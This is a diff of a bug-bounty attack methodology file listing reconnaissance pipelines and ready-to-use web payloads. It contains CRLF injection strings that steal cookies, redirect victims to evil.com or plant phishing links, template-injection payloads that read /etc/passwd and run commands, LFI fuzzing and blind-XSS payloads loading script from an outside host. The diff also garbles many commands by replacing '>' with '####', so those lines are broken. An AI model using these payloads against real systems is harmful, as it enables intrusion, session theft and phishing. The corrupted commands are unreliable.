@@ -12,7 +12,7 @@ Discovers subdomains using subfinder with recursive enumeration and
 saves results to a file.
 
 ``` bash
-subfinder -d example.com -all -recursive > subexample.com.txt
+subfinder -d example.com -all -recursive #### subexample.com.txt
 ```
 
 ## Live Subdomain Filtering
@@ -21,7 +21,7 @@ Filters discovered subdomains using httpx and saves the alive ones to a
 file.
 
 ``` bash
-cat subexample.com.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subexample.coms_alive.txt
+cat subexample.com.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 #### subexample.coms_alive.txt
 ```
 
 ## Subdomain Takeover Check
@@ -58,7 +58,7 @@ Collects URLs using GAU and saves them to a file.
 
 ``` bash
 echo example.com | gau --mc 200 | urldedupe >urls.txt
-cat urls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep '=' | sort > output.txt
+cat urls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep '=' | sort #### output.txt
 cat output.txt | sed 's/=.*/=/' >final.txt
 ```
 
@@ -511,37 +511,37 @@ if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR''XOR(if(
 
 ### Payloads
 
-> Basic injection payload to test for CRLF vulnerabilities (extra headers/HTML)
+#### Basic injection payload to test for CRLF vulnerabilities (extra headers/HTML)
 ```text
 %0d%0a%0d%0a%3Ch1%3ECoffinxp%3C%2Fh1%3E%0A%3Cp%3ECRLF%20Injection%20PoC%3C%2Fh1%3E
 ```
 
-> Bypass headers like X-XSS-Protection and inject scripts
+#### Bypass headers like X-XSS-Protection and inject scripts
 ```text
 %3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
 ```
 
-> Redirect victim via injected response
+#### Redirect victim via injected response
 ```text
 %0d%0a%0d%0a%3Cscript%3Edocument.location.href%3D%22https%3A%2F%2Fevil.com%22%3C%2Fscript%3E
 ```
 
-> Script execution in SVG with crafted Content-Length
+#### Script execution in SVG with crafted Content-Length
 ```text
 %0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a%0d%0a/%2f%2e%2e
 ```
 
-> Image onerror prompt
+#### Image onerror prompt
 ```text
 %0d%0a%0d%0a%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E
 ```
 
-> Full-screen iframe overlay
+#### Full-screen iframe overlay
 ```text
 %0d%0a%0d%0a%3Ciframe%20src%3D%22https%3A%2F%2Fwww.nasa.gov%2F%22%20style%3D%22border%3A%200%3B%20position%3Afixed%3B%20top%3A0%3B%20left%3A0%3B%20right%3A0%3B%20bottom%3A0%3B%20width%3A100%25%3B%20height%3A100%25%22%3E%0A
 ```
 
-> Phishing anchor
+#### Phishing anchor
 ```text
 %0d%0a%0d%0a%3CA%20HREF%3D%22https%3A%2F%2Fwww.cia.gov%2F%22%3ELogin%20Here%20%3C%2FA%3E%0A%0A
 ```
@@ -639,7 +639,7 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 
 ### Ruby Template Exploits
 
-```erb
+```bash
 <%= File.open('/etc/passwd').read %>
 {php}echo id;{/php}
 ```
@@ -660,47 +660,47 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 
 ### Commands
 
-> VirusTotal — Domain report (subdomains, IPs)
+#### VirusTotal — Domain report (subdomains, IPs)
 ```text
 https://www.virustotal.com/vtapi/v2/domain/report?apikey=<api_key>&domain=<DOMAIN>
 ```
 
-> VirusTotal — Extract IP addresses
+#### VirusTotal — Extract IP addresses
 ```bash
 curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=<DOMAIN>&apikey=<api_key>" | jq -r '.. | .ip_address? // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
 ```
 
-> VirusTotal — Extract subdomains
+#### VirusTotal — Extract subdomains
 ```bash
 curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=<api_key>&domain=<DOMAIN>" | jq -r '.domain_siblings[]'
 ```
 
-> AlienVault OTX — Extract IPs from URL list
+#### AlienVault OTX — Extract IPs from URL list
 ```bash
 curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/<DOMAIN>/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
 ```
 
-> URLScan.io — Extract IPs from results
+#### URLScan.io — Extract IPs from results
 ```bash
 curl -s "https://urlscan.io/api/v1/search/?q=domain:<DOMAIN>&size=10000" | jq -r '.results[]?.page?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
 ```
 
-> Wayback Machine — Historical URLs
+#### Wayback Machine — Historical URLs
 ```text
 https://web.archive.org/cdx/search/cdx?url=<DOMAIN>&fl=original&collapse=urlkey
 ```
 
-> Shodan — Search by favicon hash
+#### Shodan — Search by favicon hash
 ```text
 http.favicon.hash:1265477436
 ```
 
-> Shodan — SSL CN search and verify with httpx
+#### Shodan — SSL CN search and verify with httpx
 ```bash
 shodan search Ssl.cert.subject.CN:"<DOMAIN>" 200 --fields ip_str | httpx-toolkit -sc -title -server -td
 ```
 
-> Nmap — Inspect SSL certificate on a host
+#### Nmap — Inspect SSL certificate on a host
 ```bash
 nmap --script ssl-cert -p 443 <IP Address>
 ```
@@ -716,113 +716,113 @@ nmap --script ssl-cert -p 443 <IP Address>
 
 ### Steps & Commands
 
-> 1) Subdomain discovery
+#### 1) Subdomain discovery
 ```bash
-subfinder -d example.com -all -recursive > subdomain.txt
+subfinder -d example.com -all -recursive #### subdomain.txt
 ```
 
-> 2) Alive filtering
+#### 2) Alive filtering
 ```bash
-cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
+cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 #### subdomains_alive.txt
 ```
 
-> 3) Passive URLs
+#### 3) Passive URLs
 ```bash
 katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
 ```
 
-> 4) Sensitive files
+#### 4) Sensitive files
 ```bash
 cat allurls.txt | grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5'
 ```
 
-> 5–9) URL fetching & normalization
+#### 5–9) URL fetching & normalization
 ```bash
 echo example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txt
 katana -u https://example.com -d 5 | grep '=' | urldedupe | anew output.txt
 cat output.txt | sed 's/=.*/=/' >final.txt
 echo example.com | gau --mc 200 | urldedupe >urls.txt
-cat urls.txt | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '=' | sort > output.txt
+cat urls.txt | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '=' | sort #### output.txt
 cat output.txt | sed 's/=.*/=/' >final.txt
 ```
 
-> 10–11) Hidden parameter discovery (Arjun)
+#### 10–11) Hidden parameter discovery (Arjun)
 ```bash
 arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers 'User-Agent: Mozilla/5.0'
 arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers 'User-Agent: Mozilla/5.0'
 ```
 
-> 12–13) CORS checks
+#### 12–13) CORS checks
 ```bash
 curl -H 'Origin: http://example.com' -I https://etoropartners.com/wp-json/
 curl -H 'Origin: http://example.com' -I https://etoropartners.com/wp-json/ | grep -i -e 'access-control-allow-origin' -e 'access-control-allow-methods' -e 'access-control-allow-credentials'
 ```
 
-> 14) Info disclosure dorks
+#### 14) Info disclosure dorks
 ```text
 site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
 ```
 
-> 15) WordPress aggressive scan
+#### 15) WordPress aggressive scan
 ```bash
-wpscan --url https://site.com --disable-tls-checks --api-token <here> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
+wpscan --url https://site.com --disable-tls-checks --api-token <here#### -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
 ```
 
-> 16 & 36) LFI methodologies
+#### 16 & 36) LFI methodologies
 ```bash
 echo 'https://example.com/' | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace 'FUZZ' | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr 'root:(x|\*|\$[^\:]*):0:0:' -v
 echo 'https://example.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr 'root:(x|\*|\$[^\:]*):0:0:'
 ```
 
-> 17–18) Directory brute force
+#### 17–18) Directory brute force
 ```bash
 dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1
 ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Forwarded-Host: localhost' -t 100 -r -o results.json
 ```
 
-> 19–20) JS file exposures
+#### 19–20) JS file exposures
 ```bash
 echo example.com | katana -d 5 | grep -E '\.js$' | nuclei -t nuclei-templates/http/exposures/ -c 30
 cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/
 ```
 
-> 21–23) Subdomain takeover & CORS
+#### 21–23) Subdomain takeover & CORS
 ```bash
 subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
 python3 corsy.py -i subdomains_alive.txt -t 10 --headers 'User-Agent: GoogleBot\nCookie: SESSION=Hacked'
 ```
 
-> 24–25) XSS (single & blind)
+#### 24–25) XSS (single & blind)
 ```bash
 subfinder -d example.com | gau | bxss -payload ''><script src=https://xss.report/c/coffinxp></script>' -header 'X-Forwarded-For'
 echo 'example.com ' | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln
 subfinder -d example.com | gau | grep '&' | bxss -appendMode -payload ''><script src=https://xss.report/c/coffinxp></script>' -parameters
 ```
 
-> 26–27) Content-type filter & Shodan dork
+#### 26–27) Content-type filter & Shodan dork
 ```bash
 echo domain | gau | grep -Eo '(\/[^\/]+)\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'
 Ssl.cert.subject.CN:'example.com' 200
 ```
 
-> 28–29) XSS pipeline
+#### 28–29) XSS pipeline
 ```bash
 echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
-cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > final.txt
+cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u #### final.txt
 ```
 
-> 30–32) Network scanning
+#### 30–32) Network scanning
 ```bash
 naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt
 nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan
 masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt
 ```
 
-> 33–35) FFUF request files & header-based XSS/SSRF
+#### 33–35) FFUF request files & header-based XSS/SSRF
 ```bash
 ffuf -request lfi -request-proto https -w /root/wordlists/offensive\ payloads/LFI\ payload.txt -c -mr 'root:'
 ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr '<script>alert('XSS')</script>'
-cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e '\e[1;32m$url\e[0m'"\n"'Method[1] X-Forwarded-For: xss+ssrf => '$xss1"\n"'Method[2] X-Forwarded-Host: xss+ssrf ==...
+cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e '\e[1;32m$url\e[0m'"\n"'Method[1] X-Forwarded-For: xss+ssrf =#### '$xss1"\n"'Method[2] X-Forwarded-Host: xss+ssrf ==...
 ```
 
 ### Tips
